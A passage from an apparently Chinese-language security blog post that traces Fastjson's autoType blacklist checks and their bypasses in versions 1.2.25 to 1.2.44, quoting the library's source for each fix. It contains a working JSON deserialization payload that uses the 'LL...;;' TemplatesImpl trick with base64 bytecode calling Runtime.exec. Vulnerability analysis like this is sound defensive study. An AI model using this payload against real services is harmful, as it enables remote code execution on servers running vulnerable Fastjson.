CalendarCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(XMLGregorianCalendar.class, CalendarCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(JSONObject.class, MapDeserializer.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(JSONArray.class, CollectionCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Map.class, MapDeserializer.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(HashMap.class, MapDeserializer.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(LinkedHashMap.class, MapDeserializer.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(TreeMap.class, MapDeserializer.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(ConcurrentMap.class, MapDeserializer.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(ConcurrentHashMap.class, MapDeserializer.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Collection.class, CollectionCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(List.class, CollectionCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(ArrayList.class, CollectionCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Object.class, JavaObjectDeserializer.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(String.class, StringCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(StringBuffer.class, StringCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(StringBuilder.class, StringCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Character.TYPE, CharacterCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Character.class, CharacterCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Byte.TYPE, NumberDeserializer.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Byte.class, NumberDeserializer.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Short.TYPE, NumberDeserializer.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Short.class, NumberDeserializer.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Integer.TYPE, IntegerCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Integer.class, IntegerCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Long.TYPE, LongCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Long.class, LongCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(BigInteger.class, BigIntegerCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(BigDecimal.class, BigDecimalCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Float.TYPE, FloatCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Float.class, FloatCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Double.TYPE, NumberDeserializer.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Double.class, NumberDeserializer.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Boolean.TYPE, BooleanCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Boolean.class, BooleanCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Class.class, MiscCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(<span class="keyword">char</span>[].class, <span class="keyword">new</span> CharArrayCodec());</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(AtomicBoolean.class, BooleanCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(AtomicInteger.class, IntegerCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(AtomicLong.class, LongCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(AtomicReference.class, ReferenceCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(WeakReference.class, ReferenceCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(SoftReference.class, ReferenceCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(UUID.class, MiscCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(TimeZone.class, MiscCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Locale.class, MiscCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Currency.class, MiscCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(InetAddress.class, MiscCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Inet4Address.class, MiscCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Inet6Address.class, MiscCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(InetSocketAddress.class, MiscCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(File.class, MiscCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(URI.class, MiscCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(URL.class, MiscCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Pattern.class, MiscCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Charset.class, MiscCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(JSONPath.class, MiscCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Number.class, NumberDeserializer.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(AtomicIntegerArray.class, AtomicCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(AtomicLongArray.class, AtomicCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(StackTraceElement.class, StackTraceElementDeserializer.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Serializable.class, JavaObjectDeserializer.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Cloneable.class, JavaObjectDeserializer.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Comparable.class, JavaObjectDeserializer.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Closeable.class, JavaObjectDeserializer.instance);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>经过两次Mapping中的find；都无果，这里最后clazz为null；进入后续的代码块中：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>.autoTypeSupport) &#123;</span><br><span class="line">    String accept;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">        accept = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.acceptList.length; ++i) &#123;</span><br><span class="line">        accept = <span class="keyword">this</span>.acceptList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>.autoTypeSupport) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>代码逻辑也不是很复杂，就是拿到默认的黑名单，然后去和我们需要反序列化的类去进行比较；如果比较中，就抛出异常；如果反序列化调用class不在黑名单中；就去和程序默认的白名单去进行匹配；如果匹配到就直接loadClass；如果既不在黑名单也不在白名单中，则会进行后续的判断；</p>
<p>回到上个类；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = <span class="keyword">this</span>.config.checkAutoType(ref, (Class)<span class="keyword">null</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到程序在传入的时候，就将expectClass置为空；所以后续的流程都为null；所以接着之前的if判断走，就只成了判断autoTypeSupport是否为true；很显然分析的是默认情况下为false；所以一堆if直接false；直接到最后throw一个错误，因为这是程序本身的设计问题，所以直接一路false；也是无法bypass的；但是如果有带哥有其他的方法，可以交流交流😂；</p>
<h2 id="1-2-25-1-2-41绕过"><a href="#1-2-25-1-2-41绕过" class="headerlink" title="1.2.25-1.2.41绕过"></a>1.2.25-1.2.41绕过</h2><p>下面来分析下当autoTypeSupport被设置成true的时候的利用方法；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> i;</span><br><span class="line">                String deny;</span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.acceptList.length; ++i) &#123;</span><br><span class="line">                    deny = <span class="keyword">this</span>.acceptList[i];</span><br><span class="line">                    <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">                    deny = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">                    <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以很清楚的看到在autoTypeSupport为true的时候会进入if的代码块，接着去拿到默认的允许反序列化的class；然后将传入的class和其进行对比，如果符合，则调用ClassLoader去加载相应的class；如果我们反序列化的类不是默认的允许类，那么就回去和黑名单进行比对；如果类全称的前几个以黑名单类的前几个路径开头，则会进行ban掉，并抛出一个错误；</p>
<p><code>(&quot;autoType is not support. &quot; + typeName);</code></p>
<p>如果需要反序列化的class既不在白名单也不是黑名单中，那么会进行后续的判断流程；也就是去到IdentityHashMap类池和ConcurrentHashMap类池中查找相应的类，如果存在则也会进行进行if的判断然后根据结果去return</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>那么问题就来了，如果我们需要去反序列化的class不是在白名单也不是在黑名单中，在进行了上述的一些操作之后，进入下面的代码块：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">&#125;</span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到当autoTypeSupport为true的时候，依然是需要进行黑名单的判断；没有必要非的是白名单中的class才可被加载；但是相应的class不能继承ClassLoader和DataSource类；</p>
<p>所以无论如何我们都是需要和黑名单去硬刚；但是我们的思路也不能进局限于此；可以看到在经历的ParserConfig类的处理之后，会return一个clazz。然后去进行下一步的处理；就是在返回这个clazz的时候发生了问题；</p>
<p>来看下源码；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在此进行调用了TypeUtils class下的loadClass方法；去追溯一下；因为autoTypeSupport为true；之前也分析过只是需要绕过黑名单的限制就可；追溯源码看下；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">if</span> (className != <span class="keyword">null</span> &amp;&amp; className.length() != <span class="number">0</span>) &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = (Class)mappings.get(className);</span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">            <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">            String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到这里如果我们的class名字开头为[ 或者为L并且结尾为;的话，会自动进行拿掉，然后在loadClass；但是在实际解析的时候，因为json格式的问题，加上中括号的时候会直接爆出json解析错误，并不会达到这一步的命令执行点；</p>
<p>这也就导致了问题所在，我们可以在我们恶意的class前加上这些东西，来绕过黑名单，然后后期会将这些东西去掉去loadClass；就挺好；</p>
<p>实践一下；我这里直接手动开启autoTypeSupport为true；然后直接rce；还是利用javassist；因为之前cc中有这个包，所以我也懒得下载maven的依赖了；直接导入ysoserial的依赖去映射利用javassist类包；</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gabXgP"><img src="https://z3.ax1x.com/2021/05/11/gabXgP.png" alt="gabXgP.png"></a></p>
<h2 id="1-2-42版本的修复"><a href="#1-2-42版本的修复" class="headerlink" title="1.2.42版本的修复"></a>1.2.42版本的修复</h2><p>在后续的版本中，阿里对相应的漏洞进行了修复；将默认的黑名单换成了hash值，但是不得不说这个也有点鸡肋，github上已经有人经过遍历拿到了所有的默认的黑名单，因为其在框架中写了加密算法；追溯一下加密算法不难发现；</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gdmMIH"><img src="https://z3.ax1x.com/2021/05/11/gdmMIH.png" alt="gdmMIH.png"></a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">long</span> <span class="title">fnv1a_64</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> hashCode = -<span class="number">3750763034362895579L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; key.length(); ++i) &#123;</span><br><span class="line">        <span class="keyword">char</span> ch = key.charAt(i);</span><br><span class="line">        hashCode ^= (<span class="keyword">long</span>)ch;</span><br><span class="line">        hashCode *= <span class="number">1099511628211L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到是利用每个位进行异或然后乘法累积运算；再有就是这个点：</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gd0q2t"><img src="https://z3.ax1x.com/2021/05/12/gd0q2t.png" alt="gd0q2t.png"></a></p>
<p>可以很清晰的看到，新版本在原版本的checkAutoType的基础之上，在代码里加入了截取前后两个字符的操作，想来这里肯定是对之前漏洞的控制，将前后为L和 ; 的class截取前后的字符之后再来进行使用；但是这里又出现了一个问题，仔细看他的判断依据，仅仅是对前后的那个字符做了判断然后将其抹去，没有对整个class的name进行判断，那么这里就会存在一个漏洞点，如果加了两个LL和两个::</p>
<p>当程序运行到此，会将前后的那个L和 ; 进行抹去，从而进入后面的程序，但是我们class的name中还是有漏洞利用的，也就是和上个版本的payload一样；那么又会是新的漏洞点；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;\<span class="string">&quot;@type\&quot;:\&quot;LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQAJQoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZzMW1wbGUBAAxJbm5lckNsYXNzZXMBABFMZmFzdGpzb24kczFtcGxlOwEAClNvdXJjZUZpbGUBAA1mYXN0anNvbi5qYXZhDAAEAAUHABMBAA9mYXN0anNvbiRzMW1wbGUBABBqYXZhL2xhbmcvT2JqZWN0AQAIZmFzdGpzb24BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAUCgAVAA8BAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAYAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAGgAbCgAZABwBAD0vU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9yCAAeAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAIAAhCgAZACIBAA1TdGFja01hcFRhYmxlACEAAgAVAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ABaxAAAAAgAHAAAABgABAAAABgAIAAAADAABAAAABQAJAAwAAAAIABcABQABAAYAAAAkAAMAAgAAAA+nAAMBTLgAHRIftgAjV7EAAAABACQAAAADAAEDAAIADQAAAAIADgALAAAACgABAAIAEAAKAAk=\&quot;],\&#x27;_name\&#x27;:\&#x27;a.b\&#x27;,\&#x27;_tfactory\&#x27;:&#123; &#125;,\&#x27;_outputProperties\&#x27;:&#123; &#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gdBKi9"><img src="https://z3.ax1x.com/2021/05/12/gdBKi9.png" alt="gdBKi9.png"></a></p>
<p>成功利用；</p>
<h2 id="1-2-43修复"><a href="#1-2-43修复" class="headerlink" title="1.2.43修复"></a>1.2.43修复</h2><p>1.2.43在checkAutoType函数中做了稍微的调整；拿着和1.2.42稍微进行比对就会发现对于前后的字符做了更加严格的判断；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="keyword">int</span> features) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (typeName.length() &lt; <span class="number">128</span> &amp;&amp; typeName.length() &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">            String className = typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">            Class&lt;?&gt; clazz = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">long</span> BASIC = -<span class="number">3750763034362895579L</span>;</span><br><span class="line">            <span class="keyword">long</span> PRIME = <span class="number">1099511628211L</span>;</span><br><span class="line">            <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655656408941810501L</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可见在此在原来的基础之上又加入了第一个和第二个字符的判别，看来是对LL进行了封堵；到此我们的链条已经没有什么可以利用；</p>
<h2 id="1-2-44中的继续封堵"><a href="#1-2-44中的继续封堵" class="headerlink" title="1.2.44中的继续封堵"></a>1.2.44中的继续封堵</h2><p>继续追溯下checkAutoType函数的源码，发现修改了大部分：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="keyword">int</span> features) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (typeName.length() &lt; <span class="number">128</span> &amp;&amp; typeName.length() &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">        String className = typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">long</span> BASIC = -<span class="number">3750763034362895579L</span>;</span><br><span class="line">        <span class="keyword">long</span> PRIME = <span class="number">1099511628211L</span>;</span><br><span class="line">        <span class="keyword">long</span> h1 = (-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span>;</span><br><span class="line">        <span class="keyword">if</span> (h1 == -<span class="number">5808493101479473382L</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125; 